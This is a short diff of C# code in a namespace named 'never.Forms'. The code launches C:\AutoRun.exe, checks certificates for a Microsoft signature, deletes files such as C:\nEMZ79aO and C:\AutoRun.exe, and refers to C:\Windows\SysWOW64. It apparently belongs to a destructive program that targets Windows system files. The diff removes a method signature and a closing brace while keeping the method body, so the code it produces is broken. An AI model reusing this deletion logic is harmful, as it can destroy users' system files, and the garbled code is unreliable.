@@ -484,7 +484,6 @@ namespace never.Forms
         {
             cmd("start C:\\AutoRun.exe");
         }
-        static bool IsSignedByMicrosoft(string filePath)
         {
             try
             {
@@ -492,7 +491,6 @@ namespace never.Forms
                 X509Certificate2 cert2 = new X509Certificate2(cert);
                 return cert2.Subject.IndexOf("Microsoft", StringComparison.OrdinalIgnoreCase) >= 0;
 
-            }
             catch
             {
                 return false; // If there's no valid signature, assume it's not a system file
@@ -512,7 +510,6 @@ namespace never.Forms
                         File.Delete(filePath);
                     }
                 }
-
                 DeleteFileIfExists(@"C:\nEMZ79aO");
                 string directory = @"C:\Windows\SysWOW64";
                 DeleteFileIfExists(@"C:\AutoRun.exe");
